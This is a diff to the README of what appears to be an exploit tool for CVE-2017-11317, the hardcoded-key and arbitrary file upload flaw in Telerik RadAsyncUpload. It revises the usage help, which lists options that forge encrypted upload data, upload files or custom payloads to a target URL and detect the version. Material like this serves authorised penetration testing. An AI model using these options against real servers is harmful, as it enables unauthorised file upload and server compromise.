@@ -16,6 +16,7 @@ My other Telerik UI exploit (for CVE-2017-9248) will probably also be of interes
 
 ## To do
 - [x] Missing HMAC functionality for later versions.
+- [ ] Ability to specify custom key.
 - [ ] Brute force versions.
 
 ## Vulnerabilities
@@ -27,20 +28,25 @@ https://www.telerik.com/support/kb/aspnet-ajax/upload-%28async%29/details/insecu
 ```
 $ ./RAU_crypto_py3.py 
 
-RAU_crypto by Paul Taylor / Foregenix Ltd.
+RAU_crypto by Paul Taylor / @bao7uo 
 CVE-2017-11317 - Telerik RadAsyncUpload hardcoded keys / arbitrary file upload
 
 Usage:
 
-Decrypt a plaintext:      -d ciphertext
-Decrypt rauPostData:      -D rauPostData
-Encrypt a plaintext:      -e plaintext
-Gen rauPostData:          -E TempTargetFolder Version
-Gen rauPostData (quiet):  -Q TempTargetFolder Version
-Version in HTTP response: -v url
-Generate a POST payload:  -p TempTargetFolder Version filename
-Upload a payload:         -P TempTargetFolder Version filename url
+Decrypt a ciphertext:               -d ciphertext
+Decrypt rauPostData:                -D rauPostData
+Encrypt a plaintext:                -e plaintext
 
+Generate file upload rauPostData:   -E c:\\destination\\folder Version
+Generate all file upload POST data: -p c:\\destination\\folder Version ../local/filename
+Upload file:                        -P c:\\destination\\folder Version c:\\local\\filename url [proxy]
+
+Generate custom payload POST data : -c partA partB
+Send custom payload:                -c partA partB url [proxy]
+
+Version in HTTP response:           -v url [proxy]
+
+Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau
 $
 
 ```
